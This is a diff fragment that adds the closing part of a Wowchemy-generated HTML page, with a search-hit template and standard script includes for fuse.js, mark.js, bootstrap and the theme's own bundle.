+              <div class="article-metadata search-hit-type">{{type}}</div>
+              <p class="search-hit-description">{{snippet}}</p>
+            </div>
+          </div>
+        </div>
+      </script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/fuse.js/3.2.1/fuse.min.js" integrity="sha256-VzgmKYmhsGNNN4Ph1kMW+BjoYJM2jV5i4IlFoeZA9XI=" crossorigin="anonymous"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/mark.js/8.11.1/jquery.mark.min.js" integrity="sha256-4HLtjeVgH0eIB3aZ9mLYF6E8oU5chNdjU6p6rrXpl9U=" crossorigin="anonymous"></script>
+      
+    
+
+    
+    
+
+    
+    
+    
+    
+
+    <script src="/js/_vendor/bootstrap.bundle.min.f81d0a1705048649befc8b595e455a94.js"></script>
+
+    
+    
+      
+      
+      
+      
+      
+      
+      
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+      
+      
+    
+    
+    <script src="/en/js/wowchemy.min.e20609e6ad3f7fce339ee2e74f13682b.js"></script>
+
+    
+
+
+
+
+
+
+</body>
+</html>
